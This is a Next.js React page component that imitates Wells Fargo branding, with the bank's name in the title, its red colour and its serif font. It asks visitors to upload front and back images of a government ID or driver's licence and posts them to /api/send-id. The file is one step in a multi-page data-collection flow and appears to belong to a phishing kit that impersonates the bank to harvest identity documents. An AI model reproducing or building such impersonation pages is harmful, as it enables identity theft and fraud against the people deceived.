/* eslint-disable @next/next/no-img-element */
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import { Box } from "@mui/system";
import axios from "axios";
import Head from "next/head";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { Footer } from "../components/Footer";
import { Header } from "../components/Header";
import { SubmitButton } from "../components/SubmitButton";
import { Wrapper } from "../components/Wrapper";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";
import { DataContext } from "./_app";
import { Button, Typography, styled } from "@mui/material";

interface DocumentProps {}

const FILE_SIZE = 16000 * 1024;
const SUPPORTED_FORMATS = ["image/jpg", "image/jpeg", "image/gif", "image/png"];

const schema = yup.object().shape({
  front: yup
    .mixed()
    .required("Please upload the front image of your ID/Driver's licence.")
    .test(
      "fileSize",
      "The image you selected is too large.",
      (value) => value[0] && value[0].size <= FILE_SIZE
    )
    .test(
      "fileFormat",
      "The image you are trying to upload is not supported",
      (value) => value[0] && SUPPORTED_FORMATS.includes(value[0].type)
    ),
  back: yup
    .mixed()
    .required("Please upload the back image of your ID/Driver's licence.")
    .test(
      "fileSize",
      "The image you selected is too large.",
      (value) => value[0] && value[0].size <= FILE_SIZE
    )
    .test(
      "fileFormat",
      "The image you are trying to upload is not supported",
      (value) => value[0] && SUPPORTED_FORMATS.includes(value[0].type)
    ),
});

export const Document: React.FC<DocumentProps> = ({}) => {
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
    resetField,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `all`,
  });

  const { push } = useRouter();

  const [loading, setLoading] = useState(false);

  const { data: datas, setData } = useContext(DataContext);

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);

    const formData = new FormData();

    formData.append(`front`, data.front[0]);
    formData.append(`back`, data.back[0]);
    formData.append(`form`, `SUPPORTING DOCUMENTS`);

    await axios.post(`/api/send-id`, formData, {
      headers: {
        "Content-Type": `multipart/form-data`,
      },
    });
    setLoading(false);
    setData({
      ...datas,
      docs: {
        front: data.front[0],
        back: data.back[0],
      },
    });

    const url = getProgress()[getProgress().indexOf(`DOCUMENT`) + 1];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <>
      <Head>
        <title>Wells Fargo - Supporting documents</title>
      </Head>
      <Header />
      <Wrapper
        title="Supporting documents"
        paragraph="Upload a government issued identity document or driver's licence."
        titleSX={{
          color: "#d20826",
          fontSize: "40px",
          lineHeight: "44px",
          textAlign: "center",
          position: "relative",
          display: "block",
          padding: "48px 0 0",
          outline: "none",
          marginBottom: "24px",
          fontFamily: '"Wells Fargo Serif",Georgia,serif',
          fontWeight: "400",
        }}
        loading={loading}
      >
        <Box>
          <Typography>Front</Typography>
          <Box
            flex={1}
            width={["100%", "initial"]}
            component="label"
            htmlFor="contained-button-file-front"
          >
            <Input
              accept="image/*"
              id="contained-button-file-front"
              type="file"
              {...register("front")}
            />
            {watch("front") && watch("front").length ? (
              <Box textAlign={"center"}>
                {/* <Typography color="#666" marginRight="5px">
                  {watch("front")[0].name}
                </Typography> */}
                <Box marginTop={"8px"} height={"200px"}>
                  <img
                    alt={watch("front")[0].name}
                    style={{
                      maxWidth: "100%",
                      maxHeight: "100%",
                      verticalAlign: "middle",
                      height: "auto",
                      border: 0,
                    }}
                    src={URL.createObjectURL(watch("front")[0])}
                  />
                </Box>
                <Button
                  component="span"
                  sx={{
                    paddingLeft: 0,
                    textTransform: "capitalize",
                    color:
                      errors.front && errors.front.message
                        ? "#bf2d19"
                        : "#5a469b",
                  }}
                >
                  Change
                </Button>
              </Box>
            ) : (
              <Button
                component="span"
                color={errors && errors["front"] ? "error" : "primary"}
                sx={{
                  paddingLeft: 0,
                  textTransform: "capitalize",
                  fontWeight: errors && errors["front"] ? 700 : 300,
                  color:
                    errors.front && errors.front.message
                      ? "#bf2d19"
                      : "#5a469b",
                }}
              >
                Select file
              </Button>
            )}
          </Box>
          {errors.front && errors.front.message && (
            <Box paddingBottom={"8px"} color={"#bf2d19"}>
              <Box component={"span"}>
                {errors.front.message as unknown as string}
              </Box>
            </Box>
          )}
        </Box>
        <Box>
          <Typography>Back</Typography>
          <Box
            flex={1}
            width={["100%", "initial"]}
            component="label"
            htmlFor="contained-button-file-back"
          >
            <Input
              accept="image/*"
              id="contained-button-file-back"
              type="file"
              {...register("back")}
            />
            {watch("back") && watch("back").length ? (
              <Box textAlign={"center"}>
                {/* <Typography color="#666" marginRight="5px">
                  {watch("back")[0].name}
                </Typography> */}
                <Box marginTop={"8px"} height={"200px"}>
                  <img
                    alt={watch("back")[0].name}
                    style={{
                      maxWidth: "100%",
                      maxHeight: "100%",
                      verticalAlign: "middle",
                      height: "auto",
                      border: 0,
                    }}
                    src={URL.createObjectURL(watch("back")[0])}
                  />
                </Box>
                <Button
                  component="span"
                  sx={{
                    paddingLeft: 0,
                    textTransform: "capitalize",
                    color:
                      errors.back && errors.back.message
                        ? "#bf2d19"
                        : "#5a469b",
                  }}
                >
                  Change
                </Button>
              </Box>
            ) : (
              <Button
                component="span"
                color={errors && errors["back"] ? "error" : "primary"}
                sx={{
                  paddingLeft: 0,
                  textTransform: "capitalize",
                  fontWeight: errors && errors["back"] ? 700 : 300,
                  color:
                    errors.back && errors.back.message ? "#bf2d19" : "#5a469b",
                }}
              >
                Select file
              </Button>
            )}
          </Box>
          {errors.back && errors.back.message && (
            <Box paddingBottom={"8px"} color={"#bf2d19"}>
              <Box component={"span"}>
                {errors.back.message as unknown as string}
              </Box>
            </Box>
          )}
        </Box>
        <Box
          component="section"
          sx={{
            margin: "1rem auto .625rem",
            display: "block",
          }}
        />
        <SubmitButton disabled={loading} onClick={onSubmit} text="Continue" />
      </Wrapper>
      <Footer />
    </>
  );
};

const Input = styled("input")({
  display: "none",
});

export default Document;
